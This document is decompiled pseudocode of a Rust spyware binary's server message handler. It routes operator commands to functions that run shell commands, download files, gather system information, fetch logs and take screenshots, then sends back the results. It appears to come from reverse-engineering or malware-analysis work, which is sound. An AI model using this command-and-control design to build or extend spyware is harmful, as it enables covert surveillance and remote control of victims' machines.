
  void** spyware::communication::server::handle_message::h02435bd595e8370d(int64_t* arg1, int64_t arg2)

{
    int64_t rbp;
    int64_t var_8 = rbp;
    char const (** const var_338)[0x86];
    void** result;
    int64_t r12;
    int64_t r13;
    int64_t r15_1;
    
    switch (*arg1 ^ 0x8000000000000000)
    {
        case 0:
        {
            int128_t var_2a8_1 = *(arg1 + 0x18);
            int128_t var_2b8 = *(arg1 + 8);
            rbp = 1;
            r12 = 1;
            int128_t var_198;
            spyware::actions::commands::run_command_message::h528f548903eb1e39(&var_198, &var_2b8);
            int64_t var_168;
            int64_t var_260_1 = var_168;
            int128_t var_178;
            int128_t var_270_1 = var_178;
            int128_t var_188;
            int128_t var_280_1 = var_188;
            int128_t var_290_1 = var_198;
            int64_t var_298 = -0x7fffffffffffffff;
            r12 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_298, arg2);
            r12 = 1;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(result);
            int64_t r15 = -0x8000000000000000 ^ *arg1;
            
            if (r15 > 8)
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            
            switch (r15)
            {
                case 0:
                case 6:
                case 8:
                {
                    return result;
                    break;
                }
                case 1:
                case 3:
                case 5:
                case 7:
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
                    break;
                }
                case 2:
                case 4:
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1]);
                    break;
                }
            }
            break;
        }
        case 2:
        {
            int64_t var_2c8_1 = arg1[3];
            int128_t var_2d8 = *(arg1 + 8);
            rbp = 1;
            r13 = 1;
            int128_t var_160;
            spyware::actions::basic_info::download_file_message::h8a802bf593e1dd2f(&var_160, 
                &var_2d8);
            int64_t var_130;
            int64_t var_220_1 = var_130;
            int128_t var_140;
            int128_t var_230_1 = var_140;
            int128_t var_150;
            int128_t var_240_1 = var_150;
            int128_t var_250_1 = var_160;
            int64_t var_258 = -0x7ffffffffffffffd;
            r13 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_258, arg2);
            r13 = 1;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(result);
            int64_t r15_2 = -0x8000000000000000 ^ *arg1;
            
            if (r15_2 > 8)
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            
            switch (r15_2)
            {
                case 0:
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..ErrorInfo$GT$::ha6f395fa99b84bfa(&arg1[1]);
                    break;
                }
                case 1:
                case 3:
                case 5:
                case 7:
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
                    break;
                }
                case 2:
                case 6:
                case 8:
                {
                    return result;
                    break;
                }
                case 4:
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1]);
                    break;
                }
            }
            break;
        }
        case 4:
        {
            int64_t var_328_2 = arg1[3];
            var_338 = *(arg1 + 8);
            int128_t var_70;
            spyware::actions::basic_info::get_basic_info_request::h37840dd4820167af(&var_70);
            int128_t var_40;
            int128_t var_88_1 = var_40;
            int128_t var_50;
            int128_t var_98_1 = var_50;
            int128_t var_60;
            int128_t var_a8_1 = var_60;
            int128_t var_b8 = var_70;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_b8, arg2));
            r12 = 1;
            r13 = 1;
            result = core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&var_338);
            rbp = 0;
            r15_1 = -0x8000000000000000 ^ *arg1;
            
            if (r15_1 > 8)
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            break;
        }
        case 6:
        {
            rbp = 1;
            r12 = 1;
            r13 = 1;
            int128_t var_128;
            spyware::actions::log_actions::get_logs_request::h84eb7739ff3a4934(&var_128);
            int64_t var_f8;
            int64_t var_1e0_1 = var_f8;
            int128_t var_108;
            int128_t var_1f0_1 = var_108;
            int128_t var_118;
            int128_t var_200_1 = var_118;
            int128_t var_210_1 = var_128;
            int64_t var_218 = -0x7ffffffffffffff9;
            r12 = 1;
            r13 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_218, arg2);
            label_44c9c7:
            rbp = 1;
            r12 = 1;
            r13 = 1;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(result);
            r15_1 = -0x8000000000000000 ^ *arg1;
            
            if (r15_1 > 8)
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            break;
        }
        case 8:
        {
            rbp = 1;
            r12 = 1;
            r13 = 1;
            int128_t var_f0;
            spyware::actions::screenshot_actions::get_screenshot_request::h77f87121c90614c4(
                &var_f0);
            int64_t var_c0;
            int64_t var_1a0_1 = var_c0;
            int128_t var_d0;
            int128_t var_1b0_1 = var_d0;
            int128_t var_e0;
            int128_t var_1c0_1 = var_e0;
            int128_t var_1d0_1 = var_f0;
            int64_t var_1d8 = -0x7ffffffffffffff7;
            r12 = 1;
            r13 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_1d8, arg2);
            goto label_44c9c7;
        }
        default:
        {
            result = core::sync::atomic::atomic_load::h8c88032dab18ab12();
            
            if (result)
            {
                var_338 = &data_4b8b10;
                int64_t var_330_1 = 1;
                int64_t var_328_1 = 8;
                int128_t var_320_1 = {0};
                rbp = 1;
                r12 = 1;
                r13 = 1;
                int64_t rax_5 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8b98);
                char const* const var_300 = "spyware::communication::serverUn…";
                int64_t var_2f8_1 = 0x1e;
                char const* const var_2f0_1 = "spyware::communication::serverUn…";
                int64_t var_2e8_1 = 0x1e;
                int64_t var_2e0_1 = rax_5;
                r12 = 1;
                r13 = 1;
                result = log::__private_api::log::h13afddf373bd7d7f(&var_338, 1, &var_300);
            }
            
            rbp = 1;
            r15_1 = -0x8000000000000000 ^ *arg1;
            
            if (r15_1 > 8)
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
        }
    }
    
    switch (r15_1)
    {
        case 0:
        {
            return core::ptr::drop_in_place$LT$spyware..communication..messages..ErrorInfo$GT$::ha6f395fa99b84bfa(&arg1[1]);
            break;
        }
        case 1:
        case 3:
        case 5:
        case 7:
        {
            return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            break;
        }
        case 2:
        {
            return core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1]);
            break;
        }
        case 4:
        {
            if (!rbp)
                return result;
            
            return core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1]);
            break;
        }
        case 6:
        case 8:
        {
            return result;
            break;
        }
    }
}
